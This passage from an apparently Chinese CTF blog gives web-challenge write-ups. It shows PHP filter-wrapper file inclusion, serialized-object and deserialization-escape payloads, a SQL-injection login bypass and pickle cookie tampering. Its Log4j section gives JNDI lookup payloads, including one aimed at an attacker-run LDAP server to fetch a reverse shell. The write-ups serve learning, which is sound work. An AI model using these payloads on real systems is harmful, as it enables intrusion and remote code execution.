class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-number">47</span>))</span><br></code></pre></td></tr></table></figure><p>回显: Array<br>查看Array目录</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-number">47</span>)))</span><br></code></pre></td></tr></table></figure><p>发现f1agg文件，查看</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">var_dump</span><span class="hljs-params">(file_get_contents(chr(<span class="hljs-number">47</span>)</span></span><span class="hljs-selector-class">.chr</span>(<span class="hljs-number">102</span>)<span class="hljs-selector-class">.chr</span>(<span class="hljs-number">108</span>)<span class="hljs-selector-class">.chr</span>(<span class="hljs-number">97</span>)<span class="hljs-selector-class">.chr</span>(<span class="hljs-number">97</span>)<span class="hljs-selector-class">.chr</span>(<span class="hljs-number">103</span>)<span class="hljs-selector-class">.chr</span>(<span class="hljs-number">47</span>)))  <span class="hljs-comment">//注意是&#x27;/f1aag而8是f1aag&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="解析替换作业"><a href="#解析替换作业" class="headerlink" title="解析替换作业"></a>解析替换作业</h3><p><img src="/images/%E5%88%B7%E9%A2%98/%E8%A7%A3%E6%9E%90%E6%9B%BF%E6%8D%A2.png"></p><h2 id="ZJCTF-2019-NiZhuanSiWei-php伪协议"><a href="#ZJCTF-2019-NiZhuanSiWei-php伪协议" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei (php伪协议)"></a>[ZJCTF 2019]NiZhuanSiWei (php伪协议)</h2><p>进入页面，源码贴脸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看完了，就是php反序列化，决定8看wp自己做出来<br>另外面试的时候可没有让你查资料的机会，所以该记的payload还是有意识记一下</p><p>注释里的useless.php是阔以访问的，但是是空白页面，看来得想办法通过反序列化看源码<br>然后….file正则匹配绕8过去…于是就去看wp了…..(完美打破立的flag)</p><p>首先，会访问text文件并读取里面字符串，这就要用到伪协议: data:&#x2F;&#x2F;写入协议了:<br>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf<br>然后是file，绕8过，但是你有想到甚么吗? 文件包含漏洞啊！次奥，这都想8到<br>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p><p>然后得到base64编码的流，解码获得useless.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <span class="hljs-comment">//读取+显示$this-&gt;file</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>嗯….我觉得到这步真的阔以靠自己做了，起码先试着分析:<br>toString: 可以通过调用它来执行查看file，它在当一个对象被当作字符串使用时被调用<br>unserialize: 调用__wakeup,，没源码，略过</p><p>所以怎么通过反序列化实现对__tostring的调用? 还是说有别的方法?<br>哦，在echo $password时就会调用tostring….你个憨货</p><p>对象是什么? 是Flag, 构造:<br>password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><p>结果发现你想多了….最后这么构造:<br>text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}<br>然后查看源码即可看到flag….</p><p>还是不熟练啊啊啊啊啊啊啊啊啊啊啊♂啊啊啊啊!!!!</p><h2 id="网鼎杯-2020-青龙组-AreUSerialze-php版本不同可能导致反序列化的结果也不同"><a href="#网鼎杯-2020-青龙组-AreUSerialze-php版本不同可能导致反序列化的结果也不同" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialze (php版本不同可能导致反序列化的结果也不同)"></a>[网鼎杯 2020 青龙组]AreUSerialze (php版本不同可能导致反序列化的结果也不同)</h2><p>很水的一道题，没必要写wp，记录下做题遇到的问题</p><p>在构造payload时遇到了php版本8适应的问题，导致构造好的payload回显老是失败，为此实际操作时记得试试8同的php版本(不同php版本在序列化含private||protected的类时得到的结果可能8一样)</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xdu抗疫CTF</title>
    <link href="/2022/01/09/xdu%E6%8A%97%E7%96%ABCTF/"/>
    <url>/2022/01/09/xdu%E6%8A%97%E7%96%ABCTF/</url>
    
    <content type="html"><![CDATA[<p>挺有收获的比赛，本fw被kill7imer师傅带飞，也让俺看到自己和大佬之间的巨大差距</p><p>分个人赛(萌新赛)和队伍赛，挑里面8会的题记录学习一下</p><p>未全写完，挖坑。。。。。</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="打飞机"><a href="#打飞机" class="headerlink" title="打飞机"></a>打飞机</h2><p>一个页面游戏，要达到5000分才能看flag，无法抓包，所以推测应该是控制台输入，但是没学过js，只能胡乱试，后来发现在f12控制台输入score&#x3D;1000000000, 就阔以获取flag了</p><h2 id="让我访问"><a href="#让我访问" class="headerlink" title="让我访问"></a>让我访问</h2><p>进去后是段php源码，要求请求方式是”HS”，然而搜索请求头相关知识，请求方式有6种包括GET、POST等，’HS’显然是出题人捏出来的，当时8知道怎么改，就8会<br>后来看师傅wp，原来是这么改，请求头的第一行就是请求方式<br><img src="/images/%E6%8A%97%E7%96%ABctf/web(1).png"></p><h2 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h2><p>就是前段时间闹得很火的漏洞，然鹅没做出，看师傅题解</p><h3 id="log4j漏洞"><a href="#log4j漏洞" class="headerlink" title="log4j漏洞"></a>log4j漏洞</h3><p>先扫盲，dns是将你输入的域名翻译成ip地址的东西，那么dnslog就是用来记录用户对域名访问信息的文件，可以在<a href="http://dnslog.cn/">dnslog.cn</a> (dns日志记录平台)查询某个域名的访问记录<br>payload:<br>    ${jndi:ldap:&#x2F;&#x2F;xxxxxx}</p><p>log4j这个漏洞捏，就是只要这个log4j这个组件存在于日志里面(含有payload), 就阔以触发，于是就胡乱塞就阔以了</p><h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><p>先访问<a href="http://dnslog.cn/">dnslog.cn</a>, 点Get SubDomain获取1个随记域名，然后它会返回这个域名的查询信息, 然后将域名插入payload, (eg:${jndi:ldap:&#x2F;&#x2F;mfhdpe.dnslog.cn), 然后就….到处塞(这也是官方预期解)</p><p>此题中，下载附件可以看到在application.properties文件中，logging.level.root&#x3D;error, 也就是…要触发访问错误服务器才会将这次访问记录在dnslog, 所以我们在网址后加个&#x2F;123(访问1个叫123的并不存在的文件)，结果自然是404</p><p>再经过尝试，将headers里的ACCEPT所默认的东东改成payload，发送，访问错误，被记录在日志中，然后回到<a href="http://dnslog.cn/">dnslog.cn</a>,刷新日志查询，会发现多了1次请求查询</p><p>然后在1个有公网ip的服务器启动恶意LDAP服务，然后将服务器的ip插入payload,${jndi:ldap:&#x2F;&#x2F;xx.xxx.xx&#x2F;Basic&#x2F;ReverseShell&#x2F;xx.xx(和前面一样的网址)}, 这部分没学过，先挖个坑<br>仍按照之前方式将含payload的headers发送</p><p>然后LDAP恶意服务会加载1个恶意的类到本地去执行(然而java某个版本后这个方法就8能用了，它会把从远程加载这个选项默认关闭)</p><p>填…………….坑</p><hr><h2 id="组队赛login"><a href="#组队赛login" class="headerlink" title="组队赛login"></a>组队赛login</h2><p>这道题让俺被梁佬暴击</p><p>一进去是个登录页面，然后过滤单引号、但不过滤双引号，因此应该是单引号注入<br>过滤空格，可以用url码绕过<br>然后一边开burp爆破一边构造payload, 然后半路上这题居然被爆出来了。。。</p><p>所以有时候爆破这方法也能有效</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>先猜测原sql语句为<br>    select * from uers where uesername&#x3D;’admin’ and password&#x3D;”$password”<br>然后构造$password&#x3D;’”&#x3D;”‘闭合，于是原Sql语句就变成了<br>    select * from users where username&#x3D;’admin’ and password&#x3D;””&#x3D;””</p><p>此处用到sql语言的1个特性<br>password&#x3D;””的值为0，而””的值也为0，所以结果也就是0&#x3D;0，也就是1，就绕过了……</p><h3 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h3><p>然后成功进入后根据提示进入另一个php页面，php源码如下，根据hint需要用到php反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);   <span class="hljs-comment">//flag.php!!!!!!!!!</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replace</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span>=<span class="hljs-string">&quot;/flag/i&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&quot;nono!&quot;</span>,<span class="hljs-variable">$payload</span>); <span class="hljs-comment">//匹配payload中的filter并替换，此处的/i表示大小写不敏感，(在菜鸟在线里验证过，单双引号的区别</span><br>&#125;;<br><span class="hljs-variable">$sss</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ky&#x27;</span>];  <span class="hljs-comment">//单引号，不转义, 此处为用户输入的可构造payload部分</span><br><span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss1&#x27;</span>]=<span class="hljs-string">&#x27;webwebweb&#x27;</span>;<br><span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss2&#x27;</span>]=<span class="hljs-string">&#x27;pwnpwnpwn&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$sss</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$sss</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)&gt;=<span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//返回flag在php中第一次出现位置的数字 若没有则返回FALSE，所以必须出现上述</span><br>        <span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss1&#x27;</span>]=<span class="hljs-variable">$sss</span>;  <span class="hljs-comment">//ss1换成payload</span><br>        <span class="hljs-variable">$ctf</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctf</span>)));<span class="hljs-comment">//serialize:序列化一个对象或数组，返回字符串；调用replace，把&quot;/flag/i&quot;换成nono!，可以双写绕过</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss2&#x27;</span>]===<span class="hljs-string">&quot;webwebweb&quot;</span>)&#123;   <span class="hljs-comment">//3个=，强比较，没法绕</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在花了1下午学习php反序列化漏洞原理，第二天上网查，各种姿势构不出来</p><p>然后俺抱着试一试的态度去问reverse大师梁佬，把俺学习的文章甩给他</p><p>然后kill7imer佬，在不会php没学过Sql注入的情况下，花了20min就构出来了，让我感觉智商被按在地上摩擦</p><p>payload:<br>    flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag”;s:4:”sss2”;s:9:”webwebweb”;}</p><p>利用的是php反序列化底层语法漏洞，后来知道叫做反序列化逃逸，在unserialize函数把1个字符串反序列完后，不管后面是什么都8影响</p><h2 id="L-inc"><a href="#L-inc" class="headerlink" title="L-inc"></a>L-inc</h2><p>这道题2021的miniL-ctf上出过，当时也是8会，现在重学一下</p><p>为此要学习Python序列化</p><p>进入页面，被提示要成为vip才能访问，于是抓包，发现能改的也就cookie了</p><p>cookie一看是base64，放进网站解码一下<br><img src="/images/web(2).png"></p><p>发现解了但没完全解，中间的一堆’…’8知道是什么，而且把它们换成普通的.之后base编码的内容也变了，当时就卡这里了。<br>后来才发现，这个解码网站会自动把无法显示的字符替换为’.’，于是要用Python的base64模块解码才行</p><h3 id="学习Python的序列化与反序列化"><a href="#学习Python的序列化与反序列化" class="headerlink" title="学习Python的序列化与反序列化"></a>学习Python的序列化与反序列化</h3><p>和一般的反序列化类似，网上都能学，此处说说遇到的问题</p><p>遇到的问题就是一开始写脚本，如下，将cookie进行base64解码，得到一串二进制字符，然后用pickle.load()进行解析，发现解析失败…..</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle,base64<br>cookie=<span class="hljs-string">&#x27;gASVLAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjANjeXOUjAN2aXCUiXViLg==&#x27;</span><br>a=base64.b64decode(cookie)<br><span class="hljs-built_in">print</span>(a)<br>b=pickle.loads(a)<br>b.vip=<span class="hljs-literal">True</span><br>b.name=<span class="hljs-string">&#x27;7bmk&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;D:\desktop\python代码\cookie.txt&#x27;</span>,wb) <span class="hljs-keyword">as</span> f:<br>    r=pickle.dump(b,f)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;D:\desktop\python代码\cookie.txt&#x27;</span>,rb) <span class="hljs-keyword">as</span> f:<br>    exp=f.read()<br>    b=base64.b64encode(exp).decode()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64,pickle<br><span class="hljs-keyword">from</span> re <span class="hljs-keyword">import</span> M<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,n,a</span>):<br>        self.name=n<br>        self.age=a<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Print</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self.name+<span class="hljs-string">&#x27;_i5_&#x27;</span>+self.age)<br><br>Jack=Person(<span class="hljs-string">&#x27;Jack&#x27;</span>,<span class="hljs-number">18</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;D:\desktop\python代码\cookie1.txt&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    pickle.dump(Jack,f)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;D:\desktop\python代码\cookie1.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    txt=f.read()<br><span class="hljs-built_in">print</span>(txt)<br></code></pre></td></tr></table></figure><p>有2个办法，1是用python的1个模块叫pickletools；2是尝试手动把序列化后的字符翻译回去</p><p>先试试法2，如上述代码，在定义了Person类并初始化对象Jack后，将Jack序列化，再打印序列化结果，如下:</p><pre><code class="hljs">b&#39;\x80\x04\x955\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x04Jack\x94\x8c\x03age\x94K\x12ub.&#39;</code></pre><p>再看看原cookie经过解码后的字符:</p><pre><code class="hljs">b&#39;\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x03app\x94\x8c\x04User\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x037bmk\x94\x8c\x03vip\x94\x89ub.&#39;</code></pre><p>似乎8是很难进行比较，然后就阔以在相应的地方进行改动。8过如果属性数过多有些容易看漏，而pickletools模块阔以帮我们自动反序列化，用法8再赘述</p><p>于是在反序列化后，将属性vip的值由False改为True，再经过base64编码，就构造出payload了……</p><h3 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h3><p>然后是SSTI注入，还没学，这里先填个坑，草草草草草草草草草草草草草草草草草草草草草草草草草草草草</p><h2 id="ez-unserialize-php反序列化"><a href="#ez-unserialize-php反序列化" class="headerlink" title="ez_unserialize(php反序列化)"></a>ez_unserialize(php反序列化)</h2><p>先帖源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$secret</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p1</span>, <span class="hljs-variable">$p2</span></span>)</span>&#123;    <span class="hljs-comment">//Ok，这次是真正的反序列化实践了!</span><br>        <span class="hljs-variable language_">$this</span>-&gt;var1 = <span class="hljs-variable">$p1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;var2 = <span class="hljs-variable">$p2</span>;<br>    &#125;      <span class="hljs-comment">//无感</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;var1-&gt;secret = <span class="hljs-variable language_">$this</span>-&gt;var2;   <span class="hljs-comment">//-&gt;:表示引用对象的成员</span><br>    &#125;        <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">Hello</span>();   <span class="hljs-comment">//调用Hello方法</span><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$p1</span>, <span class="hljs-variable">$p2</span></span>)</span>&#123;<br>        <span class="hljs-variable">$p2</span>-&gt;<span class="hljs-variable">$p1</span>();                 <span class="hljs-comment">//执行p2类下的p1函数</span><br>    &#125;                      <span class="hljs-comment">//先过</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hello</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to 西电战役CTF!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p1</span></span>)</span>&#123;  <br>        <span class="hljs-variable language_">$this</span>-&gt;var1 = <span class="hljs-variable">$p1</span>;   <br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$p1</span>, <span class="hljs-variable">$p2</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;var1);   <span class="hljs-comment">//call_user_func调用$this-&gt;var1的函数，有啥意义?</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p1</span>, <span class="hljs-variable">$p2</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;var1 = <span class="hljs-variable">$p1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;var2 = <span class="hljs-variable">$p2</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;sandbox&quot;</span>;    <span class="hljs-comment">//关键词？?</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>))&#123;   <span class="hljs-comment">//is_dir():检查$dir是否为1个文件夹（若$dir为相对路径，则按照当前工作目录检查），是则返回TRUE(bool)，否则返回FALSE</span><br>            <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;sandbox&#x27;</span>);  <span class="hljs-comment">//mkdir创建文件夹，mkdir(path,mode,recursive(可选，看不懂),context(可选，看不懂))  翻译:创建叫sandbox的文件夹，可访问</span><br>        &#125;<br>        <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;sandbox&#x27;</span>);  <span class="hljs-comment">//chdir：改变当前目录为&#x27;sandbox&#x27;</span><br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var1 . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]) . <span class="hljs-string">&quot;.php&quot;</span>; <br>        <span class="hljs-comment">/*$_SERVER 是一个包含诸如头信息（header）、路径（path）和脚本位置（script locations）的数组,超全局变量。</span><br><span class="hljs-comment">        remote_addr:正在浏览当前页面用户的 IP 地址*/</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span 